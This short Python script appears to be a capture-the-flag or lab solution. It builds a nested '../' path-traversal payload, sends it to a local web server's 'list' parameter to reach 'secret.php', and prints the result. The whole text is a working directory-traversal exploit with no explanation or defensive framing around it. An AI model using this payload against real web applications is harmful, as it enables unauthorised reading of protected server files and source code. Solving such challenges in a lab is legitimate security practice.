from requests import get
url = 'http://localhost:1337'

def payload(N=101):
    if N == 0:
        return ''
    return f'..{payload(N-1)}/'

r=get(f'{url}/?list={payload()*5}secret.php').text

print(r)
